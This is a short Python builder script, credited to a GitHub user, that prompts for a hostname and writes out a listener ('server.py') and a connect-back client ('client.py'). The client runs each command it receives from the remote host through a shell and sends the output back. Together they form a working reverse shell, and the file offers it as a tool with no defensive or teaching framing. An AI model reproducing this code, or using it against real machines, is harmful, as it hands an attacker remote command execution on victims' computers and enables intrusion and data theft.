# Made by TerrificTable (https://github.com/TerrificTable)

class builder:
    def __init__(self) -> None:
        self.hostname = input("Hostname (ip): ")
        opt = input("Server or Client [1/2]: ")
        if str(opt) == "server" or str(opt) == "1":
            self.server()
        elif str(opt) == "client" or str(opt) == "2":
            self.client()
        elif str(opt) == "both":
            self.server()
            self.client()
        else:
            print("Invalid Input")

    def server(self):
        prompt = input("Prompt ($>, $:, ...)")

        server_code = """import socket
def send_cmd(s, conn):
    print("$> ", end="")
    while 1:
        try:
            cmd = input()
            if len(cmd) > 0:
                conn.sendall(cmd.encode())
                data = conn.recv(1924)
                try:
                    print(data.decode("utf-8"), end="")
                except:
                    print("[-] Error while trying to display result")
                    print("$> ", end="")
        except KeyboardInterrupt:
            conn.close()
            s.close()
            exit()
        except Exception as e:
            print(e)
            conn.close()
            s.close()
            exit()
def server(addr):
    try:
        s = socket.socket()
        s.bind(addr)
        s.listen()
        print("[+] Listening")
    except Exception as e:
        print("[-] " + e)
        restart = input("[?] Restart (y/n): ")
        if restart.lower() == "y":
            server(addr)
        else:
            print("[+] Exiting")
            exit()
    conn, client_addr = s.accept()
    print(f"[+] Connection from: {client_addr}")
    send_cmd(s, conn)
if __name__ == "__main__":
    HOST = ("<<HOSTNAME>>", 5000)
    server(HOST)
        """.replace("<<HOSTNAME>>", self.hostname).replace("$>", prompt)

        with open("./server.py", "w") as f:
            f.write(server_code)
        print("Succsessfully built Server")

    def client(self):
        client_code = """import subprocess
import socket
import os
def recv(s):
    while 1:
        cmd_bytes = s.recv(1024)
        cmd = cmd_bytes.decode("utf-8")
        if cmd.startswith("cd "):
            os.chdir(cmd[3:])
            s.send(b"$> ")
            continue
        if len(cmd) > 0:
            p = subprocess.run(cmd, shell=True, capture_output=True)
            data = p.stdout + p.stderr
            s.send(data + b"$> ")
def connect(addr):
    try:
        s = socket.socket()
        s.connect(addr)
        print(f"[+] Connected to: {addr}")
    except socket.error as e:
        print("[-] " + e)
        exit()
    recv(s)
if __name__ == "__main__":
    HOST = ("<<HOSTNAME>>", 5000)
    connect(HOST)
        """.replace("<<HOSTNAME>>", self.hostname)
        with open("./client.py", "w") as f:
            f.write(client_code)
        print("Succsessfully built Client")


if __name__ == "__main__":
    builder()
